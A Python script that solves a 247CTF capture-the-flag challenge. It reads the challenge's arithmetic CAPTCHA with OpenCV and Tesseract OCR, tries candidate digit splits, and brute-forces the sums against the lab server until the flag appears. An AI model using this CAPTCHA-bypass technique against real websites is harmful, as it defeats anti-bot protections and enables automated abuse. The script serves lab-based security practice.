#!/usr/bin/env python3
import cv2
import numpy as np
import pytesseract
import requests
import re

BASE_URL = "https://087ba594e710a16e.247ctf.com/"

session = requests.Session()
session.get(BASE_URL)

# Descargar UNA imagen y probar TODAS las respuestas posibles con diferentes OCR
img_response = session.get(BASE_URL + "mturk.php")
nparr = np.frombuffer(img_response.content, np.uint8)
img = cv2.imdecode(nparr, cv2.IMREAD_GRAYSCALE)

print("Probando diferentes preprocesos y OCR:\n")

configurations = []

# Probar diferentes configuraciones
for thresh_val in [115, 120, 125, 127, 130, 135]:
    for invert in [True, False]:
        if invert:
            _, binary = cv2.threshold(img, thresh_val, 255, cv2.THRESH_BINARY_INV)
        else:
            _, binary = cv2.threshold(img, thresh_val, 255, cv2.THRESH_BINARY)
        
        resized = cv2.resize(binary, None, fx=10, fy=10, interpolation=cv2.INTER_CUBIC)
        
        for psm in [6, 7, 8]:
            text = pytesseract.image_to_string(resized, config=f'--psm {psm}').strip()
            
            # Extraer todos los dígitos
            all_digits = ''.join(re.findall(r'\d', text))
            
            if len(all_digits) >= 3:
                # Probar splits
                for split in range(1, min(len(all_digits), 9)):
                    if split < len(all_digits):
                        a_str = all_digits[:split]
                        b_str = all_digits[split:]
                        
                        if a_str and b_str:
                            a = int(a_str)
                            b = int(b_str)
                            result = a + b
                            
                            configurations.append({
                                'thresh': thresh_val,
                                'invert': invert,
                                'psm': psm,
                                'a': a,
                                'b': b,
                                'result': result,
                                'text': text[:40]
                            })

print(f"Total de configuraciones a probar: {len(configurations)}\n")

# Probar cada una
tested = set()
for i, config in enumerate(configurations[:50]):  # Limitar a 50 pruebas
    result_key = config['result']
    
    # No probar el mismo resultado dos veces
    if result_key in tested:
        continue
    tested.add(result_key)
    
    # Crear nueva sesión para cada intento
    test_session = requests.Session()
    test_session.get(BASE_URL)
    test_session.get(BASE_URL + "mturk.php")
    
    data = {"captcha": str(config['result'])}
    response = test_session.post(BASE_URL, data=data)
    
    status = "✗" if "invalid" in response.text.lower() else "✓✓✓"
    
    print(f"{i+1}. T={config['thresh']}, Inv={config['invert']}, PSM={config['psm']}, Split para {config['a']}+{config['b']}={config['result']}: {status}")
    
    if status == "✓✓✓":
        print(f"\n¡CONFIGURACIÓN CORRECTA ENCONTRADA!")
        print(f"  Threshold: {config['thresh']}")
        print(f"  Invertido: {config['invert']}")
        print(f"  PSM: {config['psm']}")
        print(f"  Ecuación: {config['a']} + {config['b']} = {config['result']}")
        print(f"  Texto OCR: '{config['text']}'")
        
        if "flag" in response.text.lower() or "247ctf{" in response.text.lower():
            flag_match = re.search(r'247CTF\{[^}]+\}', response.text, re.IGNORECASE)
            if flag_match:
                print(f"\nFLAG: {flag_match.group(0)}")
        break

print(f"\nTotal probado: {len(tested)} respuestas únicas")
